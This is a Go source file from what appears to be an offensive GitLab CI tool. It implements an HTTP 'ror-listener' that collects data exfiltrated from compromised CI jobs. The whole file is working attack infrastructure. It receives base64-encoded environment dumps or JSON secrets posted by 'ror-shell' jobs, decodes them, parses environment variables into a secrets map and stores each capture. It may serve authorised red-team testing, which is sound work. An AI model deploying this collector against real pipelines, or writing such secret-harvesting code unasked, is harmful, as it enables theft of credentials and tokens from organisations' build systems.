package cmd

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/store"
)

// CallbackResult holds the result of a single received callback.
type CallbackResult struct {
	Addr    string            `json:"addr"`
	Secrets map[string]string `json:"secrets"`
	Raw     string            `json:"raw,omitempty"`
	Time    time.Time         `json:"time"`
}

// Listener is an HTTP server that receives exfiltrated data from ror-shell jobs.
type Listener struct {
	srv         *http.Server
	addr        string
	secretStore *store.Store
	gitlabURL   string
	target      string
	results     []*CallbackResult
	mu          sync.Mutex
	out         io.Writer
}

// NewListener creates a new ror-shell listener.
func NewListener(listenAddr string, out io.Writer, secretStore *store.Store, gitlabURL, target string) *Listener {
	return &Listener{
		addr:        listenAddr,
		out:         out,
		secretStore: secretStore,
		gitlabURL:   gitlabURL,
		target:      target,
		results:     make([]*CallbackResult, 0),
	}
}

// Addr returns the actual listen address after the server starts.
func (l *Listener) Addr() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.addr
}

// Run starts the HTTP server and blocks until context is cancelled.
func (l *Listener) Run(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleExfil)
	mux.HandleFunc("/health", l.handleHealth)

	l.srv = &http.Server{
		Addr:              l.addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      10 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	ln, err := net.Listen("tcp", l.addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", l.addr, err)
	}

	// Update addr with the actual address (resolves port 0, IPv6 brackets, etc.)
	l.mu.Lock()
	l.addr = ln.Addr().String()
	l.mu.Unlock()

	fmt.Fprintf(l.out, "[ror-listener] listening on %s\n", l.addr)

	// Shutdown on context cancellation
	go func() {
		<-ctx.Done()
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = l.srv.Shutdown(shutCtx)
	}()

	if err := l.srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		return fmt.Errorf("serve: %w", err)
	}
	return nil
}

// Stop gracefully shuts down the listener.
func (l *Listener) Stop(ctx context.Context) error {
	if l.srv == nil {
		return nil
	}
	return l.srv.Shutdown(ctx)
}

// WaitFor blocks until the context is done or until data is received.
// Returns all collected results.
func (l *Listener) WaitFor(ctx context.Context, timeout time.Duration) ([]*CallbackResult, error) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return l.getResults(), nil
		case <-time.After(timeout):
			return l.getResults(), nil
		case <-ticker.C:
			l.mu.Lock()
			if len(l.results) > 0 {
				l.mu.Unlock()
				return l.getResults(), nil
			}
			l.mu.Unlock()
		}
	}
}

// getResults returns a copy of collected results.
func (l *Listener) getResults() []*CallbackResult {
	l.mu.Lock()
	defer l.mu.Unlock()
	cp := make([]*CallbackResult, len(l.results))
	copy(cp, l.results)
	return cp
}

// handleExfil receives base64-encoded env dump or JSON secrets from CI jobs.
func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 5<<20)) // 5MB max
	if err != nil || len(body) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	result := &CallbackResult{
		Addr: r.RemoteAddr,
		Time: time.Now().UTC(),
	}

	// Try to decode as base64-encoded env dump
	raw := strings.TrimSpace(string(body))
	if decoded, err := base64.StdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
		result.Raw = string(decoded)
		result.Secrets = parseEnvVars(string(decoded))
	} else if decoded, err := base64.RawStdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
		result.Raw = string(decoded)
		result.Secrets = parseEnvVars(string(decoded))
	} else {
		// Try as JSON secrets
		var secrets map[string]string
		if err := json.Unmarshal(body, &secrets); err == nil && len(secrets) > 0 {
			result.Secrets = secrets
			result.Raw = string(body)
		} else {
			// Store raw as-is, try parsing as env vars anyway
			result.Raw = string(body)
			result.Secrets = parseEnvVars(string(body))
		}
	}

	l.mu.Lock()
	l.results = append(l.results, result)
	l.mu.Unlock()

	fmt.Fprintf(w, `{"status":"ok","received":%d}`+"\n", len(l.results))
}

// handleHealth returns a simple health check response.
func (l *Listener) handleHealth(w http.ResponseWriter, r *http.Request) {
	l.mu.Lock()
	count := len(l.results)
	l.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "ok",
		"results":   count,
		"listening": true,
	})
}

// parseEnvVars parses raw env var output into a map.
func parseEnvVars(raw string) map[string]string {
	secrets := make(map[string]string)
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, '=')
		if idx <= 0 {
			continue
		}
		key := line[:idx]
		value := line[idx+1:]
		secrets[key] = value
	}
	return secrets
}
